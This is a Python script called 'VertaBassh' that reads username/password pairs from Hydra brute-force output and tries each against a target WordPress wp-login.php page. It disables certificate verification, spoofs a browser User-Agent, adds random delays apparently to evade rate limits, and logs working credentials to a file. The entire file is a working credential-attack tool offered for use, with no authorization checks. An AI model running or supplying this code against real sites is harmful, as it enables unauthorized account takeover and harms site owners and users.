
import requests
import urllib3
import re
import time
import random
import argparse
import sys
from datetime import datetime
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from colorama import Fore, Style, init
from itertools import cycle

# Initialize colorama for colored output
init(autoreset=True)

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Script version and credits
VERSION = "1.0.0"
CREDITS = [
    "@crazywind27"
]

# ASCII Art Banner
ascii_banner = r"""
{Fore.CYAN}
    __     __       _        _                   _     
    \ \   / /__ _ __| |_ __ _| |__   __ _ ___ ___| |__  
     \ \ / / _ \ '__| __/ _` | '_ \ / _` / __/ __| '_ \ 
      \ V /  __/ |  | || (_| | |_) | (_| \__ \__ \ | | |
       \_/ \___|_|   \__\__,_|_.__/ \__,_|___/___/_| |_|                                           
                                                      
{Style.RESET_ALL}
"""

# Enhanced Introduction Message with Version and Credits
def display_intro():
    print(ascii_banner.format(Fore=Fore, Style=Style))
    print(f"{Fore.YELLOW}VertaBassh - WordPress Credential Validator{Style.RESET_ALL}")
    print(f"Version {Fore.GREEN}{VERSION}{Style.RESET_ALL}")
    print(f"Developed by {', '.join(CREDITS)}\n")
    print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Welcome to the {Fore.YELLOW}WordPress Credential Validation Script!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}\n")
    print(f"{Fore.MAGENTA}Target Site:        {Fore.WHITE}{login_url}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}Hydra Output File:  {Fore.WHITE}{hydra_output_file}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}Results Output File:{Fore.WHITE} {output_file}{Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}Purpose:{Style.RESET_ALL} This script tests username and password combinations")
    print(f"{' ' * 8}extracted from the specified file to validate access on the target WordPress site.\n")
    print(f"{Fore.GREEN}Let's begin testing...{Style.RESET_ALL}\n")
    time.sleep(2)

# Argument parser setup with error handling for missing or incorrect switches
def parse_arguments():
    parser = argparse.ArgumentParser(
        description="WordPress Credential Validation Script",
        usage="python VertaBassh.py -u <URL> -f <file> [-l <limit>] [-o <output file>]",
    )
    parser.add_argument("-u", "--url", required=True, help="Target login URL (e.g., https://example.com/wp-login.php)")
    parser.add_argument("-f", "--file", required=True, help="Path to the hydra output file with usernames and passwords")
    parser.add_argument("-l", "--limit", type=int, default=None, help="Limit the number of tests to run")
    parser.add_argument("-o", "--output", help="Specify a custom output file for results")
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    return parser.parse_args()

# Main code execution
args = parse_arguments()
login_url = args.url
hydra_output_file = args.file
test_limit = args.limit

# Determine output file name
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
output_file = args.output if args.output else f"VertaBassh_results_{timestamp}.txt"

# Display the introduction message
display_intro()

# Initialize a list to hold extracted credentials
credentials = []

# Regular expression pattern to extract successful credentials from Hydra output
pattern = r"login:\s(\S+)\s+password:\s(\S+)"

# Read the specified hydra output file and extract credentials
with open(hydra_output_file, "r") as file:
    for line in file:
        match = re.search(pattern, line)
        if match:
            username = match.group(1)
            password = match.group(2)
            credentials.append({"username": username, "password": password})

# Apply the test limit if specified
if test_limit:
    credentials = credentials[:test_limit]

# Spinner for status processing indicator
spinner = cycle(["|", "/", "-", "\\"])

# Initialize counters and lists
total_tests = 0
success_count = 0
failure_count = 0
connection_error_count = 0
success_logins = []

# Function to validate credentials with retry mechanism and persistent session
def validate_credentials(username, password, session):
    global total_tests, success_count, failure_count, connection_error_count
    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': login_url,
        'testcookie': '1'
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
    }

    try:
        response = session.post(login_url, data=payload, headers=headers, timeout=10, verify=False)
        total_tests += 1
        
        if "dashboard" in response.text.lower():
            success_count += 1
            success_logins.append((username, password))
            print(f"\r{Fore.GREEN}Testing {username}:{password} - Success {Style.RESET_ALL}{next(spinner)}", end='', flush=True)
            return "Success"
        else:
            failure_count += 1
            print(f"\r{Fore.RED}Testing {username}:{password} - Failed {Style.RESET_ALL}{next(spinner)}", end='', flush=True)
            return "Failed"
    except requests.exceptions.ConnectionError:
        connection_error_count += 1
        print(f"\r{Fore.YELLOW}Testing {username}:{password} - Connection aborted. Retrying... {Style.RESET_ALL}{next(spinner)}", end='', flush=True)
        return "Connection Error"

# Set up a retry strategy
retry_strategy = Retry(
    total=3,
    backoff_factor=1,
    status_forcelist=[429, 500, 502, 503, 504],
)
adapter = HTTPAdapter(max_retries=retry_strategy)

# Use a session with the retry strategy and persistent connection
with requests.Session() as session:
    session.mount("https://", adapter)
    with open(output_file, "w") as f:
        f.write("WordPress Credential Validation Script Results\n")
        f.write(f"Target URL: {login_url}\n")
        f.write(f"Hydra Output File: {hydra_output_file}\n")
        f.write(f"Test Date: {datetime.now()}\n")
        f.write("\n" + "="*40 + "\n")

        for cred in credentials:
            status = validate_credentials(cred["username"], cred["password"], session)
            f.write(f"Tested {cred['username']}:{cred['password']} - Status: {status}\n")
            time.sleep(random.uniform(5, 10))

        f.write("\n" + "="*40 + "\n")
        f.write(f"Total Tests Attempted: {total_tests}\n")
        f.write(f"Successful Logins: {success_count}\n")
        f.write(f"Failed Logins: {failure_count}\n")
        f.write(f"Connection Errors: {connection_error_count}\n")
        f.write("="*40 + "\n")
        if success_logins:
            f.write("\nSuccessful Logins Found:\n")
            for username, password in success_logins:
                f.write(f"Username: {username} Password: {password}\n")
            f.write("="*40 + "\n")

# Display message with output file path
print(f"\n{Fore.CYAN}Results saved to {output_file}{Style.RESET_ALL}\n")

# Read and display the output file contents for direct viewing
with open(output_file, "r") as f:
    print(f"{Fore.CYAN}Displaying results from {output_file}:{Style.RESET_ALL}\n")
    print(f.read())
